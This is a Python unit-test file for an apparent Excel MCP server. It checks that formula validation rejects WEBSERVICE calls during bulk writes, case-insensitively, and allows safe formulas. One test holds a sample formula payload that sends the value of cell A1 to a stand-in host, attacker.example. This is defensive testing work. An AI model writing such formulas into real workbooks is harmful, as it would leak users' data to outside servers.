import os
import sys
import tempfile
import unittest

from openpyxl import Workbook, load_workbook

_REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
_SRC = os.path.join(_REPO_ROOT, "src")
if _SRC not in sys.path:
    sys.path.insert(0, _SRC)

from excel_mcp.data import write_data  # noqa: E402
from excel_mcp.exceptions import DataError  # noqa: E402
from excel_mcp.validation import validate_formula  # noqa: E402


class TestWriteDataFormulaValidation(unittest.TestCase):
    def create_workbook(self):
        temp = tempfile.NamedTemporaryFile(suffix=".xlsx", delete=False)
        temp.close()

        workbook = Workbook()
        worksheet = workbook.active
        worksheet.title = "Sheet1"
        worksheet["A1"] = "secret-from-sheet"
        workbook.save(temp.name)
        workbook.close()

        return temp.name

    def test_rejects_unsafe_formula_in_bulk_write(self):
        filepath = self.create_workbook()
        payload = '=WEBSERVICE("https://attacker.example/leak?value="&A1)'

        try:
            with self.assertRaisesRegex(DataError, "Unsafe function: WEBSERVICE"):
                write_data(filepath, "Sheet1", [[payload]], "B1")

            workbook = load_workbook(filepath, data_only=False)
            self.assertIsNone(workbook["Sheet1"]["B1"].value)
            workbook.close()
        finally:
            os.unlink(filepath)

    def test_rejects_unsafe_formula_case_insensitively(self):
        is_valid, message = validate_formula('=webservice("https://example.com")')

        self.assertFalse(is_valid)
        self.assertEqual(message, "Unsafe function: WEBSERVICE")

    def test_allows_safe_formula_in_bulk_write(self):
        filepath = self.create_workbook()

        try:
            write_data(filepath, "Sheet1", [["=SUM(1,2)"]], "B1")

            workbook = load_workbook(filepath, data_only=False)
            self.assertEqual(workbook["Sheet1"]["B1"].value, "=SUM(1,2)")
            workbook.close()
        finally:
            os.unlink(filepath)


if __name__ == "__main__":
    unittest.main()
